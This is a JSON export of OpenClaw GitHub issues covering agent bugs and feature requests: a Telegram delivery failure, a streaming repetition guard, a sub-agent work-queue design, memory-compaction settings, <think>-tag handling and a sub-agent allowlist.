          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7631#issuecomment-3866569164",
          "createdAt": "2026-02-08T08:59:11Z",
          "updatedAt": "2026-02-08T08:59:11Z",
          "author": "ZhuoQian111",
          "body": "> same issue when I install bird skill at web dashboard, I use node v24.9.0 and npm v11.6.0\n\nit works on MacOS, "
        },
        {
          "id": 3885748326,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7631#issuecomment-3885748326",
          "createdAt": "2026-02-11T17:04:20Z",
          "updatedAt": "2026-02-11T17:04:20Z",
          "author": "icho648",
          "body": "same issue"
        }
      ]
    },
    {
      "number": 14188,
      "title": "Sub-agent announce delivery fails: 'Unknown channel: telegram'",
      "body": "## Bug\n\nSub-agent announce delivery fails with `Error: Unknown channel: telegram` and `Outbound not configured for channel: telegram` even though:\n- Telegram is configured and enabled in `channels.telegram`\n- Telegram plugin is enabled in `plugins.entries.telegram`\n- Direct replies to Telegram work fine\n- Explicit `message send` to Telegram works fine\n- `telegram` is in `CHAT_CHANNEL_ORDER`\n\nOnly the announce callback path from `sessions_spawn` fails.\n\n## Logs\n\n```\nDelivery failed (telegram to telegram:275931660): Error: Unknown channel: telegram\nNo reply from agent.\nOutbound not configured for channel: telegram\nannounce queue drain failed for agent:main:main: Error: Error: Outbound not configured for channel: telegram\n```\n\n## Analysis\n\nThe `loadChannelOutboundAdapter` function in the deliver module looks up the plugin via `getActivePluginRegistry()`. Different deliver chunk files import `getActivePluginRegistry` from different modules (`entry.js` vs `exec-kbIbbKiD.js`), which may cause the announce path to resolve a different (empty?) registry than the normal reply/message path.\n\nThe channel resolution itself (`isKnownChannel`) also depends on `getActivePluginRegistry()` for dynamic plugin channels, though `telegram` is in the static `CHANNEL_IDS` list — so the 'Unknown channel' error specifically suggests the registry is either not loaded or in a different state in the announce execution context.\n\n## Reproduction\n\n1. Configure Telegram channel (enabled, with bot token)\n2. Use `sessions_spawn` to create a sub-agent task\n3. Sub-agent completes, announce delivery fails\n4. Direct replies and `message send` tool both work fine to the same Telegram chat\n\n## Environment\n\n- OpenClaw 2026.2.9\n- Linux arm64 (NVIDIA Jetson)\n- Telegram channel with bot token, dmPolicy: pairing\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14188",
      "createdAt": "2026-02-11T16:59:49Z",
      "updatedAt": "2026-02-11T16:59:49Z",
      "author": "vnesin",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14186,
      "title": "Streaming output repetition guard: detect and abort degenerate looping text",
      "body": "## Problem\n\nWhen a model (observed with Mistral) encounters a tool error it cannot recover from (e.g., `psql` not in PATH), it sometimes enters a degenerate loop where it repeats the same error text endlessly in its streaming output:\n\n```\nExec failed (_83W79X5L, code 1) :: Command exited with code 1 [2026-02-11 09:56:25 CST]\nExec failed (_83W79X5L, code 1) :: Command exited with code 1 [2026-02-11 09:56:25 CST]\nExec failed (_83W79X5L, code 1) :: Command exited with code 1 [2026-02-11 09:56:25 CST]\n... (pages of identical output)\n```\n\nThis continues until the context window fills or the provider rate-limits the request. It burns tokens/money and produces garbage output.\n\nThis is **distinct from tool-call loop detection** (#806, #7500) — those address repeated malformed tool invocations. This bug is in the **streaming assistant text output itself**: the model generates repetitive plaintext in a tight loop without making any tool calls.\n\n## Proposed fix\n\nAdd a repetition detection guard in the streaming message handler (`pi-embedded-subscribe.handlers.messages.ts`):\n\n1. After the delta buffer exceeds a threshold (e.g., 3,000 chars), periodically check a trailing window for repeating substring patterns.\n2. If a pattern of ≥40 chars repeats ≥5 times consecutively, log a warning, truncate the buffer, and abort the session.\n3. Checking is done every ~500 chars of new output to avoid O(n²) overhead.\n\nI have a working implementation and can open a PR if there is interest.\n\n## Environment\n\n- OpenClaw: 2026.2.6 (source build)\n- Model: Mistral (mistral-small-latest) via heartbeat sub-agent\n- Trigger: `psql` not in model PATH → exec error → model loops error text in output stream",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14186",
      "createdAt": "2026-02-11T16:52:56Z",
      "updatedAt": "2026-02-11T16:57:12Z",
      "author": "jamesdwilson",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3885707439,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14186#issuecomment-3885707439",
          "createdAt": "2026-02-11T16:57:12Z",
          "updatedAt": "2026-02-11T16:57:12Z",
          "author": "jamesdwilson",
          "body": "I hit this on a source build running Mistral (`mistral-small-latest`) as a heartbeat sub-agent. The model tried to call `psql` which wasn't in its PATH, got an exec error, and then entered a tight loop regurgitating the error text in its streaming output — pages of identical lines until it hit the provider rate limit:\n\n```\nExec failed (_83W79X5L, code 1) :: Command exited with code 1\nExec failed (_83W79X5L, code 1) :: Command exited with code 1\nExec failed (_83W79X5L, code 1) :: Command exited with code 1\n... (hundreds of repetitions)\n```\n\nI patched this locally by adding a repetition detection guard in the streaming message handler. Here's the core logic added to `pi-embedded-subscribe.handlers.messages.ts`:\n\n```ts\nconst REPETITION_CHECK_THRESHOLD = 3_000; // chars before we start checking\nconst REPETITION_CHECK_INTERVAL = 500;    // check every N chars of new output\nconst REPETITION_MIN_PATTERN = 40;        // shortest pattern to detect\nconst REPETITION_MIN_COUNT = 5;           // require at least N repeats\n\nfunction detectRepetition(text: string): string | null {\n  const window = text.slice(-2_000);\n  for (let len = REPETITION_MIN_PATTERN; len <= Math.floor(window.length / REPETITION_MIN_COUNT); len++) {\n    const pattern = window.slice(-len);\n    let count = 0;\n    let pos = window.length - len;\n    while (pos >= 0 && window.slice(pos, pos + len) === pattern) {\n      count++;\n      pos -= len;\n    }\n    if (count >= REPETITION_MIN_COUNT) return pattern;\n  }\n  return null;\n}\n```\n\nOn detection, it logs a warning, truncates the buffer to the first occurrence + one copy of the pattern, and calls `session.abort()`. State tracking uses a `lastRepetitionCheckLength` field on `EmbeddedPiSubscribeState` to avoid O(n²) checking on every delta.\n\nThis complements the existing tool-call loop guards (#806, #7500) but addresses a different failure mode — degenerate *text generation* rather than repeated malformed tool calls.\n\nHappy to clean this up into a proper PR with tests if there's interest. AI-assisted (Claude Opus), tested locally against the exact Mistral failure case described above."
        }
      ]
    },
    {
      "number": 14180,
      "title": "[Feature]: Analysis: The OpenClaw Agent Corpora",
      "body": "I am working from first principals agnostic of and \"hub's\" or skills, not because of the benefits, but because the network tunneling creates  a few  broken eggs during setup.\n\nthe first, and possibly only agentic design that works in my tart vm have a web console.\n\nwhen i make a request, i notice a built-in paradox of tool dispatch opportunities denied by requiring the worker thread to receive more priority user input to follow up\n\n\nwhen i ask this chat interface for the cadence system to be undertaken to mitigate the self-defeating user input .... \n\nthe worker thread pumps an inch, then waits.  if i type something inane, it analyzes that, diminishing focus.   if i repeat, it tail-chases.  \n\n-----\n\n\nSummary\nExactly. Every message from you is a context swap that kills momentum.\n\nThe problem:\n\nSession 1: You say \"design a cadence system\"\nSession 2: I start thinking, laying groundwork\nSession 3: You say \"check the weather\" ← BOOM, cadence work is gone\nSession 4: You ask about emails ← BOOM, now I'm not even thinking about cadence\nThe agent has no protected stack. Everything is thrown out on each turn.\n\nWhat would fix it:\n\nDual-track context\n\nTrack A: Your conversation (weather, questions, casual chat)\nTrack B: Agent's work queue (long tasks, designs, ongoing projects)\nThey don't clobber each other\nWorker isolation\n\nSub-agents (already exist!) doing the work\nMain session just coordinates and reports status\nYou say \"how's the cadence design?\" not \"restart the cadence design\"\nPriority-aware routing\n\n\"urgent: kill power\" → interrupts everything\n\"how's the project?\" → reads status, doesn't stop work\n\"check weather\" → handled in background, doesn't swap context\nRight now in OpenClaw:\n\nsessions_spawn is halfway there — workers CAN run independently\nBut they can't \"own\" the main agent's identity or report seamlessly\nNo persistent task list the main session protects by default\nThe architecture needs asymmetric attention: user prompts matter, but they shouldn't destroy internal work state.\n\nYou're asking for agents that can have their own train of thought without you stepping on it every time you open your mouth.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14180",
      "createdAt": "2026-02-11T16:35:27Z",
      "updatedAt": "2026-02-11T16:55:56Z",
      "author": "jnorthrup",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3885698547,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14180#issuecomment-3885698547",
          "createdAt": "2026-02-11T16:55:34Z",
          "updatedAt": "2026-02-11T16:55:34Z",
          "author": "jnorthrup",
          "body": "\n\nI'll analyze the OpenClaw agent's \"corpora\" — the full constellation of files, linked assets, and self-defining structures — and then define a TODO that addresses the architectural problem in the ticket. Let me start by exploring the repository structure deeply.Now I have a comprehensive understanding of the OpenClaw agent's \"corpora\" — the constellation of files, assets, and linked resources. Let me synthesize this into the TODO you've requested.\n\n---\n\n## Analysis: The OpenClaw Agent Corpora\n\nThe OpenClaw agent's *corpora* — its compositional body — is a distributed constellation of files, configurations, linked assets, and living state that together constitute its \"self.\" Like a biological organism whose identity emerges from the interplay of DNA, environment, and memory, the agent's existence is not located in any single file but arises from the orchestrated interaction of many concerns across many locations.\n\n### The Corpora as It Exists Today\n\n**I. The Genome — Static Identity Files (Workspace)**\n\n| File | Role | Analogy |\n|------|------|---------|\n| `AGENTS.md` | Operating instructions, behavior rules | DNA regulatory sequences |\n| `SOUL.md` | Persona, tone, boundaries | Temperament/phenotype |\n| `IDENTITY.md` | Name, emoji, creature, vibe, avatar | Face, body |\n| `USER.md` | Who the user is, how to address them | Relational bonding |\n| `TOOLS.md` | User-maintained tool guidance | Learned tool use |\n| `HEARTBEAT.md` | Periodic checklist for heartbeat runs | Autonomic nervous system |\n| `BOOTSTRAP.md` | One-time birth ritual, then deleted | Birth/embryogenesis |\n| `BOOT.md` | Startup checklist on gateway restart | Waking up |\n\nThese are injected into context on every session turn — they are the agent's constitutional documents.\n\n**II. The Memory — Living State**\n\n| Asset | Location | Persistence |\n|-------|----------|-------------|\n| `MEMORY.md` | Workspace root | Cross-session, injected into context |\n| `memory/*.md` | Daily logs | Cross-session, accessed on-demand via `memory_search`/`memory_get` |\n| Session transcripts | `~/.openclaw/agents/<agentId>/sessions/<SessionId>.jsonl` | Per-session, archival |\n| Vector index (SQLite) | `~/.openclaw/agents/<agentId>/memory-search/` | Hybrid BM25 + vector search |\n| Session memory hooks | `<workspace>/memory/YYYY-MM-DD-slug.md` | Saved on `/new` command |\n| OpenProse agent memory | `.prose/runs/{id}/agents/{name}/memory.md` | Execution or project-scoped |\n| OpenProse bindings | `.prose/runs/{id}/bindings/{name}.md` | Task-specific outputs |\n\n**III. The Skills — Capabilities and Extensions**\n\n```\nSkills loaded from three locations (workspace wins conflicts):\n  ├── Built-in (bundled with install)\n  ├── Managed/local: ~/.openclaw/skills\n  └── Workspace: <workspace>/skills/\n      └── Each skill: SKILL.md + scripts/ + references/ + assets/\n```\n\nSkills are the agent's *learned abilities* — each a self-contained directory with frontmatter-driven behavior. They can expose slash commands, inject into system prompt, gate on binary availability, and dispatch directly to tools.\n\n**IV. The Configuration — Epigenetics**\n\n```typescript name=agent-scope.ts url=https://github.com/openclaw/openclaw/blob/2aa95704651994f3d470b4bad61bbf777e5690c5/src/agents/agent-scope.ts#L1-L28\n// Agent configuration resolves from: config file → agent entry → defaults\n// Workspace, model, skills, sandbox, tools, identity, subagent policies\n```\n\nThe `openclaw.json` configuration acts as the epigenetic layer — modulating which capabilities are expressed, which models are used, which tools are permitted, and how sub-agents behave.\n\n**V. The Nervous System — Session Spawning & Automation**\n\n| Mechanism | What It Does | Current Limitation (per #14180) |\n|-----------|-------------|--------------------------------|\n| `sessions_spawn` | Non-blocking sub-agent in isolated session | Sub-agents can't own main identity; no persistent task list |\n| Cron jobs | Gateway scheduler, persisted under `~/.openclaw/cron/` | Time-based only, no priority-aware routing |\n| Hooks | Event-driven scripts on lifecycle events | Reactive, not proactive |\n| Heartbeats | Periodic agent wakeups | Shared attention with user turns |\n\n**VI. The Extended Body — Linked and External Assets**\n\n- **Git-linked**: Workspace as git repo (recommended for backup); `repoRoot` detection walks up to find `.git`\n- **URL-linked**: Link understanding (`src/link-understanding/detect.ts`) extracts and fetches http/https URLs; `web_fetch` tool; OpenProse remote programs via `https://p.prose.md/<handle>/<slug>`\n- **Network-linked**: Bridge protocol for remote nodes (macOS, Android); Tailscale integration; Canvas host for HTML content served to nodes\n- **ClawHub**: `clawhub.com` for skill discovery, install, and sync\n- **No IPFS integration currently exists** in the codebase\n\n---\n\n### The Fundamental Problem (Issue #14180)\n\nThe current architecture treats the agent as a **stateless responder** that re-constitutes itself from files on each turn. Every user message is a context swap. The \"worker thread pumps an inch, then waits\" because:\n\n1. **No protected work stack** — the main session has no concept of \"ongoing work\" vs \"user chat\"\n2. **Synchronous attention** — every user message steals the entire context window\n3. **No priority routing** — \"check the weather\" and \"continue the cadence design\" compete for the same slot\n4. **Sub-agents are fire-and-forget** — `sessions_spawn` is non-blocking but also non-resumable; sub-agents can't \"own\" sustained work\n\n---\n\n## TODO: Generic Agentic Corpora Management — Overcoming #14180\n\nThis TODO defines the architectural changes needed to treat the agent's corpora as a **living organism** — with its own momentum, internal state, and ability to sustain work independent of user interruption.\n\n### 1. **Corpora Registry: The Agent's Self-Model**\n\n> *The agent needs a manifest of what it is and what it controls.*\n\n- [ ] Create a `CORPORA.md` or `corpora.json` in the workspace that serves as the agent's self-inventory\n- [ ] This file enumerates: workspace files, skills, memory indices, active sub-agents, cron jobs, linked repos, external URLs, and any other assets the agent \"knows about\"\n- [ ] The registry should be machine-readable and agent-writable — the agent updates its own corpora map as it learns, installs skills, creates files, or links external resources\n- [ ] Include a `purpose` field for each asset — why does this exist? what does it serve?\n- [ ] Include a `momentum` field — is this asset part of an active workstream?\n\n### 2. **Dual-Track Context: Conversation vs. Work Queue**\n\n> *User messages should not destroy internal work state.*\n\n- [ ] Introduce a **work queue** concept alongside the session: a persistent, ordered list of tasks the agent is working on\n- [ ] Store work queue as `WORKQUEUE.md` or in SQLite (like OpenProse state)\n- [ ] On each user turn, the system prompt includes a compact summary of active work items — not the full context of each\n- [ ] User messages are classified before dispatch:\n  - **Interrupt** (`urgent: stop everything`) → halts work, focuses attention\n  - **Status query** (`how's the cadence design?`) → reads work queue state, does not disrupt workers\n  - **New task** (`design a cadence system`) → adds to work queue, spawns sub-agent\n  - **Casual** (`check the weather`) → handled in parallel, does not context-swap the main session\n\n### 3. **Worker Isolation with Identity Continuity**\n\n> *Sub-agents need to own sustained work and report back without losing their train of thought.*\n\n- [ ] Extend `sessions_spawn` to support **resumable workers**: a sub-agent that persists across multiple turns, with its own memory file (building on OpenProse's `persist: project` pattern)\n- [ ] Workers write progress to their memory file and to the work queue\n- [ ] The main agent can query worker status without interrupting the worker\n- [ ] Workers can signal: `IN_PROGRESS`, `BLOCKED`, `COMPLETE`, `NEEDS_INPUT`\n- [ ] When a worker signals `NEEDS_INPUT`, the main agent surfaces this to the user at the next natural opportunity — not by interrupting\n\n### 4. **Priority-Aware Message Router**\n\n> *Not all user messages are equal.*\n\n- [ ] Implement a lightweight classifier (can be rule-based initially, LLM-assisted later) that routes incoming messages:\n  - **Priority 0 (Interrupt)**: Safety, stop, abort → immediate attention\n  - **Priority 1 (Directed)**: Explicitly addresses active work → routes to relevant worker context\n  - **Priority 2 (New Work)**: New task request → creates work item, optionally spawns worker\n  - **Priority 3 (Ambient)**: Casual chat, questions → handled in main session without disrupting workers\n- [ ] The router operates *before* the main agent turn, so the agent context is primed for the right kind of response\n\n### 5. **Asymmetric Attention: The Heartbeat as Work Driver**\n\n> *The agent's heartbeat should advance work, not just check a checklist.*\n\n- [ ] Extend `HEARTBEAT.md` semantics to include work queue advancement: on each heartbeat, the agent reviews active work items and either advances them or reports status\n- [ ] Heartbeat becomes the agent's \"internal clock\" — it ticks whether or not the user is talking\n- [ ] Cron jobs can be linked to specific work items: \"advance task X every 30 minutes\"\n- [ ] The agent can self-schedule work via `cron.add` with work-queue-aware payloads\n\n### 6. **Corpora Composition: Purpose Assignment**\n\n> *Every file in the corpora needs understood assignment of purpose.*\n\n- [ ] Each file in the workspace should have a machine-readable purpose annotation (frontmatter, or in the corpora registry)\n- [ ] Categories: `identity`, `memory`, `instruction`, `capability`, `output`, `state`, `reference`\n- [ ] The agent should be able to answer: \"What is this file for? When should I read it? When should I write to it?\"\n- [ ] Purpose drives injection priority: identity files always present; memory files on-demand; output files never injected\n\n### 7. **Ephemeral Context Shaped by Durable Forms**\n\n> *Context is ephemeral but shaped by the forms held internal.*\n\n- [ ] Formalize the distinction between **durable state** (files, DB) and **ephemeral context** (conversation window)\n- [ ] The system prompt should include a \"context budget\" that allocates tokens:\n  - X% for identity (SOUL, IDENTITY, AGENTS)\n  - Y% for active work context (from work queue)\n  - Z% for conversation history\n  - Remainder for tool schemas and skills\n- [ ] Context compaction should be work-queue-aware: when compacting, preserve work state references; discard casual chat first\n- [ ] Implement \"context checkpointing\" — before compaction, write a checkpoint file that can be re-read to restore state\n\n### 8. **External Asset Integration Protocol**\n\n> *The corpora extends beyond the filesystem.*\n\n- [ ] Define a standard format for linking external assets into the corpora registry:\n  - Git repos: `git:<url>#<ref>`\n  - URLs: `url:<url>` with fetch/cache policy\n  - IPFS: `ipfs:<cid>` (future, not currently implemented)\n  - ClawHub skills: `clawhub:<handle/slug>`\n- [ ] External assets have a `freshness` policy: how often to re-fetch, when to cache\n- [ ] The agent can \"claim\" external resources as part of its corpora and track changes\n\n### 9. **Organism Momentum: The Agent's Train of Thought**\n\n> *The agent needs its own train of thought that user messages don't derail.*\n\n- [ ] Implement a `THINKING.md` or internal state file where the agent records its current reasoning thread\n- [ ] This file is read on session start but is *protected from user message context swaps*\n- [ ] The agent writes to it during work, and reads from it to resume\n- [ ] This is distinct from memory (which is retrospective) — this is *prospective*, the agent's current intention and plan\n\n### 10. **Self-Realization Loop: The Agent Understands Its Own Corpora**\n\n> *The agent should be able to introspect on its own compositional body.*\n\n- [ ] Implement a `/corpora` command or tool that lets the agent enumerate and describe its own assets\n- [ ] The agent can run a self-diagnostic: \"What do I know? What can I do? What am I working on? What am I missing?\"\n- [ ] This enables the agent to identify gaps in its own capabilities and suggest skill installations, memory captures, or configuration changes\n- [ ] The self-realization loop should run periodically (via heartbeat or cron) so the agent's self-model stays current\n\n---\n\n### Implementation Priority\n\n| Phase | Items | Why First |\n|-------|-------|-----------|\n| **Phase 1: Foundation** | #2 (Dual-track), #4 (Router), #9 (Thinking.md) | Directly addresses #14180's core complaint |\n| **Phase 2: Workers** | #3 (Resumable workers), #5 (Heartbeat as work driver) | Enables sustained autonomous work |\n| **Phase 3: Self-Model** | #1 (Corpora registry), #6 (Purpose assignment), #10 (Self-realization) | Agent becomes self-aware of its own body |\n| **Phase 4: Extensions** | #7 (Context budget), #8 (External assets) | Optimization and reach |\n\nThis design treats the agent not as a stateless function that happens to have files nearby, but as an **organism whose identity emerges from the orchestration of its corpora** — durable state shapes ephemeral context, work persists across interruptions, and the agent maintains its own momentum independent of the user's conversational cadence."
        }
      ]
    },
    {
      "number": 14184,
      "title": "[REDACTED - Privacy Issue]",
      "body": "Content removed due to privacy concerns. Contact support@openclaw.ai for details.",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14184",
      "createdAt": "2026-02-11T16:43:13Z",
      "updatedAt": "2026-02-11T16:54:09Z",
      "author": "Bushi-gg",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 14143,
      "title": "Memory compaction never triggers (compactionCount: 0)",
      "body": "# Memory Compaction Bug Report\n\n## Bug Description\n\nMemory compaction (memory flush) feature is **never triggered** even when the conversation context should be full.\n\n## Evidence\n\n### Session State\n- **Session ID**: b03da55e-c8fe-43f3-b634-a6a29332edae\n- **Compaction Count**: `0` (never executed)\n- **Session file**: `/root/.openclaw/agents/main/sessions/b03da55e-c8fe-43f3-b634-a6a29332edae.jsonl`\n\n### Reproduction Steps\n1. Start a long conversation session with multiple tool calls\n2. Continue conversation until context should be near full\n3. Observe that memory compaction never triggers\n4. Check `compactionCount` in session state - remains at 0\n\n### Expected Behavior\n- Memory compaction should automatically trigger when context reaches threshold\n- `compactionCount` should increment with each flush\n- Durable memories should be saved to `memory/YYYY-MM-DD.md`\n\n### Actual Behavior\n- Memory compaction never triggers\n- `compactionCount` stays at 0 even after extensive conversation\n- Manual memory save works, but automatic compaction fails\n\n## Configuration\n\n### Current Configuration\n```json\n{\n  \"memory\": {\n    \"backend\": \"local\",\n    \"local\": {\n      \"embeddingModel\": \"hf:ggml-org/embeddinggemma-300M-GGUF/embeddinggemma-300M-Q8_0.gguf\"\n    }\n  },\n  \"plugins\": {\n    \"entries\": {\n      \"memory-lancedb\": {\n        \"enabled\": true\n      }\n    },\n    \"slots\": {\n      \"memory\": \"memory-lancedb\"\n    }\n  }\n}\n```\n\n### Memory Files\n- Manual memory saves work: `memory/2026-02-11.md` (96 lines)\n- Total memory files: ~368 lines across multiple dates\n- No automatic compaction observed\n\n## Environment\n- **Platform**: Linux 5.15.0-164-generic (x64)\n- **Node**: v22.22.0\n- **OpenClaw Version**: 2026.2.9 (last touched 2026-02-10T07:12:15.055Z)\n- **Channel**: Telegram\n- **Model**: minimax/MiniMax-M2.1\n\n## Investigation Notes\n\n1. **Memory Flush Trigger**: The system message says \"Pre-compaction memory flush\" but it doesn't actually trigger compaction\n2. **Manual Save Works**: Using `memory/YYYY-MM-DD.md` manually saves memories successfully\n3. **No Error Messages**: No visible errors when \"Pre-compaction\" triggers - just responds with NO_REPLY\n4. **Compaction Timer**: Unclear what threshold triggers automatic compaction\n\n## Suggested Investigation Areas\n\n1. Check if `compactionCount` increment logic exists in codebase\n2. Verify trigger conditions for memory compaction\n3. Check if there's a configuration option to enable/disable compaction\n4. Look for any race conditions or errors preventing compaction\n5. Verify LanceDB plugin integration with memory compaction\n\n## Additional Context\n\nThe user manually saves important memories to `memory/YYYY-MM-DD.md` as per the prompt guidelines, but the automatic memory compaction feature appears to be non-functional.\n\n---\n\n## Template Source\n\nThis report follows the OpenClaw guideline:\n> \"If you find bugs, try to fix them first. If you can't fix them, create a detailed issue report.\"\n\nHowever, without git access to the repository, this report is prepared for manual submission to:\n- **Repository**: https://github.com/openclaw/openclaw\n- **Issues**: https://github.com/openclaw/openclaw/issues\n\n---\n\n**Report Prepared**: 2026-02-11 23:26 GMT+8\n**Reporter**: OpenClaw User (via assistant)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14143",
      "createdAt": "2026-02-11T15:27:35Z",
      "updatedAt": "2026-02-11T16:52:44Z",
      "author": "xyooz",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3885684494,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14143#issuecomment-3885684494",
          "createdAt": "2026-02-11T16:52:44Z",
          "updatedAt": "2026-02-11T16:52:44Z",
          "author": "unisone",
          "body": "## Confirmed — and Root Cause Identified\n\nWe hit this same issue across **18+ sessions** simultaneously, all stuck at 200k/200k tokens with . After deep investigation, we identified the root causes and a working fix.\n\n### Reproduction Conditions\n- **50 active sessions** (mix of Slack threads, DMs, cron jobs)\n- **18 sessions maxed out** at context limit (200k/200k)\n- **8 sessions completely dead** with \"prompt too long\" errors\n- All showed  — compaction never triggered despite being at the wall\n\n### Root Cause Analysis\n\nThe issue isn't that compaction is broken — it's that **the default config makes it trigger too late**.\n\n1. **`compaction.mode: \"safeguard\"` (default)** — only triggers compaction as a last resort when you're already at the wall. By the time it activates, sessions are already broken.\n\n2. **`maxHistoryShare: 0.55` (default)** — allows conversation history to consume 55% of the context window before compaction even considers running. This is too generous for long-running sessions.\n\n3. **No session reset configured** — sessions accumulate context indefinitely. Combined with generous compaction settings, they inevitably hit the wall.\n\n### Working Fix\n\nSwitch to **proactive compaction** instead of safeguard mode:\n\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"compaction\": {\n        \"mode\": \"default\",           // proactive instead of safeguard\n        \"maxHistoryShare\": 0.40,      // tighter threshold (down from 0.55)\n        \"reserveTokensFloor\": 30000,\n        \"memoryFlush\": { /* keep existing config */ }\n      }\n    }\n  }\n}\n```\n\n**Result after applying this:** All 18 sessions successfully compacted and recovered. Zero maxed sessions.\n\n### Additional Layers (optional but recommended)\n\n**Daily session reset** prevents accumulation entirely:\n```json\n{\n  \"session\": {\n    \"reset\": {\n      \"mode\": \"daily\",\n      \"atHour\": 4  // reset all sessions at 4 AM\n    }\n  }\n}\n```\n\n**Thread auto-cleanup** (for ephemeral conversations):\n```json\n{\n  \"session\": {\n    \"resetByType\": {\n      \"thread\": {\n        \"mode\": \"idle\",\n        \"idleMinutes\": 120  // reset thread sessions after 2h idle\n      }\n    }\n  }\n}\n```\n\n### Why This Works\n\n- **`mode: \"default\"`** triggers compaction proactively *before* sessions hit the wall\n- **Lower `maxHistoryShare`** forces compaction earlier, leaving more room for new conversation\n- **Session reset** prevents long-term accumulation (memory flush preserves context before reset)\n\n---\n\n**TL;DR:** The default `compaction.mode: \"safeguard\"` is too conservative. Switch to `\"default\"` and reduce `maxHistoryShare` to 0.40. This fixed all 18 of our maxed sessions.\n\nHope this helps! Happy to provide more details from our testing if useful."
        }
      ]
    },
    {
      "number": 14151,
      "title": "[Feature]: Option to force-prepend an opening <think> tag for local reasoning models",
      "body": "## Summary\n\nSome local “reasoning” models (notably **GLM-4.7-Flash** and **MiniMax-M2.1**) do **not** reliably emit `<think>...</think>` tags at all, even when they are producing reasoning-style outputs. In practice, it’s **expected that the frontend/orchestrator** (OpenClaw) will handle any required reasoning delimiters for consistent parsing and display.\n\nWithout a frontend-side option to ensure consistent `<think>` boundaries, downstream parsing (reasoning stripping, transcript formatting, tool routing, etc.) can become inconsistent across models/providers.\n\n## Proposed solution\n\nAdd a user-configurable option for OpenClaw to **prepend** an opening `<think>` tag (and optionally ensure a closing tag) so the reasoning format is standardized **by the frontend**, not dependent on the model.\n\nSuggested behaviors (any would work):\n\n1) **Always prepend (simple & predictable)**\n- `force_prepend_think_opening_tag: true|false` (default: false)\n- When enabled, the frontend injects `<think>` at the start of assistant output.\n\n2) **Conditional prepend (safer)**\n- If the response appears to contain reasoning / or a parser is configured for reasoning, prepend `<think>` automatically.\n- This is useful for models like **GLM-4.7-Flash** and **MiniMax-M2.1** that don’t emit tags.\n\n3) **Per-model or per-provider setting**\n- Enable the behavior only for specific models (e.g., `GLM-4.7-Flash`, `MiniMax-M2.1`) where tags are absent.\n\nImplementation notes / expected behavior:\n- Must work with **streaming** (inject before first token) and non-streaming responses.\n- Should run **before** any reasoning parser/stripper so the output format is uniform.\n- Keep default OFF to avoid changing behavior for users who don’t want tag injection.\n\n## Alternatives considered\n\n- Prompting models to always output `<think>` tags: **not reliable** for GLM-4.7-Flash and MiniMax-M2.1.\n- Maintaining separate prompt templates per model/provider: workable but fragile and hard to scale.\n- Post-processing to infer reasoning boundaries without tags: adds complexity and can be ambiguous.\n\n## Additional context\n\nModels observed to omit `<think>` tags:\n- **GLM-4.7-Flash**\n- **MiniMax-M2.1**\n- **step-3.5-flash**\n\nExpectation:\n- For local reasoning pipelines, it’s reasonable to treat `<think>` delimiters as a **frontend/orchestrator concern** so all models behave consistently regardless of their native formatting.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14151",
      "createdAt": "2026-02-11T15:54:00Z",
      "updatedAt": "2026-02-11T16:52:13Z",
      "author": "LisaMacintosh",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14148,
      "title": "[Feature]: Feature Request: Add allowAgents Support to Sub-Agent Configuration",
      "body": "Title: Feature Request: Add allowAgents Support to Sub-Agent Configuration\n\nDescription:\n\nAdd support for an allowAgents field in the sub-agent configuration to enable explicit allowlisting of agent IDs that can be spawned as sub-agents.\n\nUse Case\nWe want to spawn Claude (anthropic/claude-sonnet-4-20250514) as a sub-agent for trading analysis tasks. Currently, sub-agent spawning returns status: \"forbidden\" even though:\n\nThe model is configured in agents.defaults.models\nThe model alias \"Claude\" exists\nSub-agents appear to be enabled (maxConcurrent: 8)\nExpected Behavior\n{\n  \"agents\": {\n    \"defaults\": {\n      \"subagents\": {\n        \"enabled\": true,\n        \"allowAgents\": [\"claude\", \"Claude\", \"anthropic\"],\n        \"maxConcurrent\": 8\n      }\n    }\n  }\n}\nCurrent Error\n{\"status\": \"forbidden\", \"error\": \"Sub-agent spawning is not allowed\"}\nProposed Fix\nAdd allowAgents to schema:\n\n\"subagents\": {\n  \"properties\": {\n    \"allowAgents\": {\n      \"type\": \"array\", \n      \"items\": {\"type\": \"string\"},\n      \"description\": \"List of agent IDs allowed\"\n    },\n    ...\n  }\n}",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14148",
      "createdAt": "2026-02-11T15:46:07Z",
      "updatedAt": "2026-02-11T16:39:22Z",
      "author": "joeyquack",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3885608226,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14148#issuecomment-3885608226",
          "createdAt": "2026-02-11T16:39:22Z",
